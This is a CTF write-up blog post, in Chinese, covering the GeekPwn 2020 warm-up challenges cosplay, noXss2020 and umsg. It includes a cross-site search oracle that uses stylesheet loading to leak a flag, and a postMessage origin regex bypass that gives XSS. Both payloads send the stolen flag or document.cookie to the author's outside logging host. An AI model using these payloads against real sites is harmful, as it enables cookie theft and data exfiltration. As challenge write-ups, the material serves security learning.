categories:
- 比赛
tags:
- ctf
- wp
title: geekpwn2020
---
# geekpwn 2020热身赛


## cosplay

直接用cos的api读取文件

```javascript
cos.getBucket({
    Bucket: Bucket,
    Region: Region,
}, function(err, data) {
    console.log(err || data.Contents);
});


cos.getObject({
    Bucket: Bucket,
    Region: Region,
    Key: 'f1L9@/flag.txt',
}, function(err, data) {
    console.log(err || data.Body);
});

```

## noXss2020

```python
from flask import Flask, request, jsonify, Response
from os import getenv

app = Flask(__name__)

DATASET = {
    114: '514',
    810: '8931919',
    2017: 'https://blog.cal1.cn/post/RCTF%202017%20rCDN%20%26%20noxss%20writeup',
    2019: 'https://hackmd.io/IlzCicHXSN-MXl2JLCYr0g?view',
    2020: 'flag{2333333333}'
}


@app.before_request
def check_host():
    pass


@app.route("/")
def index():
    return app.send_static_file('index.html')


@app.route("/search")
def search_handler():
    keyword = request.args.get('keyword')
    if keyword is None:
        return jsonify(DATASET)
    else:
        ret = {}
        for i in DATASET:
            if keyword in DATASET[i]:
                ret[i] = DATASET[i]
        return jsonify(ret), 200 if len(ret) else 404


@app.after_request
def add_security_headers(resp):
    resp.headers['X-Frame-Options'] = 'sameorigin'
    resp.headers['Content-Security-Policy'] = 'default-src \'self\'; frame-src https://www.youtube.com'
    resp.headers['X-Content-Type-Options'] = 'nosniff'
    resp.headers['Referrer-Policy'] = 'same-origin'
    return resp


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000, )

```



我们注意到search是通过in来判断是否存在，并返回404或200

虽然` http://noxss2020.cal1.cn:3000/ `有cors,但是我们并不需要他返回的内容，我们只需要状态码，这样就简单多了。我们将页面当成css来加载，通过是否加载成功来判断状态码

payload:

```html
<html>
<body>
    
<script>
var guess="flag";
var ok=true;
function check(text){
    var linkEl = document.head.querySelector('link[href*="'+text+'"');
    var cssLoaded = Boolean(linkEl.sheet);
    linkEl.addEventListener('load', function () {
        
        guess=unescape(text);
        console.log(guess)
        ok=true;
        if(guess.endsWith("}")){
            location="http://ccreater.top:60010/log.php?log="+guess;
        };
        var s = guess.substr(0,guess.length-1);
        while(tmp=document.head.querySelector('link[href*="'+s+'"')){
            tmp.remove();
        }
        fuzz()
    });
}
function make(text){
    head = document.getElementsByTagName('head')[0];

    var url = "http://127.0.0.1:3000/search?keyword="+escape(text),
    link = document.createElement('link');
    link.rel = "stylesheet";
    link.href = url;
    head.appendChild(link);
    check(escape(text));
}

async function fuzz(){
    for(i of "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}"){
        if(make(guess+i)){
            break;
        }
    }
    return true
}
function exploit(){
    fuzz()
}

fuzz()
</script>

</body>
</html>

```





## umsg

阅读代码发现：

```
function(e, t, r) {
        "use strict";
        r.r(t);
        r(91);
        var n = {
            mounted: function() {
                window.addEventListener("message", (function(e) {
                    if (e.origin.match("http://umsg.iffi.top"))
                        switch (e.data.action) {
                        case "append":
                            return void (document.getElementsByTagName("main")[0].innerHTML += e.data.payload);
                        case "debug":
                            return void console.log(e.data.payload);
                        case "ping":
                            return void e.source.postMessage("pong", "*")
                        }
                }
                ), !1),
                postMessage({
                    action: "ping"
                })
            }
        }
```

那么我们可以在页面中嵌入iframe来postMessage,从而插入恶意内容，唯一的障碍是：`e.origin.match("http://umsg.iffi.top")`

因为match是一个正则匹配函数，所以构造`http://umsg_iffi_top.evildomain`来绕过

payload:

```
<html>
<body>
    
<iframe src="http://umsg.iffi.top:3000/" height="100%" width="100%" frameborder="0" scrolling="auto">
</iframe>
<script>
setTimeout(()=>{
document.body.children[0].contentWindow.postMessage({action:"append",payload:"<img src=1 onerror='location=(`http://ccreater.top:60010/log.php?log=`+document.cookie)'>"},"http://umsg.iffi.top:3000/")
},5000);
</script>

</body>
</html>

```

